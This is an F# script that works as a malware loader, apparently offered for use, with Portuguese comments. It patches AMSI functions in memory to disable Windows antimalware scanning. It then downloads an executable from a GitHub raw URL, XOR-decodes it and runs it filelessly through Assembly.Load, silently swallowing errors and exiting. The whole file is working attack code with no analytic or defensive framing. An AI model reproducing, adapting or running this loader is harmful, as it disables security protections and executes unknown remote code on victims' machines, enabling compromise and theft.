#r "nuget: System.Management"

open System
open System.Net.Http
open System.Reflection
open System.Runtime.InteropServices
open System.Threading
open System.Diagnostics
open System.Net

[<DllImport("kernel32.dll")>]
extern IntPtr LoadLibrary(string lpFileName)
[<DllImport("kernel32.dll")>]
extern IntPtr GetProcAddress(IntPtr hModule, string procName)

type VP = delegate of IntPtr * UIntPtr * uint * byref<uint> -> bool

// Patch AMSI
let patchAmsi () =
    try
        let mutable oldProtect = 0u
        let amsi = LoadLibrary("amsi.dll")
        let kernel32 = LoadLibrary("kernel32.dll")
        let vp = Marshal.GetDelegateForFunctionPointer(GetProcAddress(kernel32, "VirtualProtect"), typeof<VP>) :?> VP
        for func in ["AmsiScanBuffer"; "AmsiInitialize"; "AmsiOpenSession"; "AmsiCloseSession"; "AmsiScanString"] do
            let ptr = GetProcAddress(amsi, func)
            if ptr <> IntPtr.Zero && vp.Invoke(ptr, UIntPtr(6u), 0x40u, &oldProtect) then
                Marshal.Copy([| 0xB8uy; 0x57uy; 0x00uy; 0x07uy; 0x80uy; 0xC3uy |], 0, ptr, 6)
    with _ -> ()

patchAmsi()

// Download e injeção
try
    patchAmsi()
    let url = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/bh.exe"
    use client = new HttpClient()
    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
    client.Timeout <- TimeSpan.FromSeconds(30.0)
    let bytes = client.GetByteArrayAsync(url).Result
    let key = 0x55uy
    let decoded = bytes |> Array.map (fun b -> b ^^^ key)
    try Assembly.Load(decoded).EntryPoint.Invoke(null, [||]) |> ignore
    with _ -> try Assembly.Load(bytes).EntryPoint.Invoke(null, [||]) |> ignore with _ -> ()
    Array.Clear(decoded, 0, decoded.Length)
    Array.Clear(bytes, 0, bytes.Length)
with _ -> ()

// Fecha o dotnet
Environment.Exit(0)
;;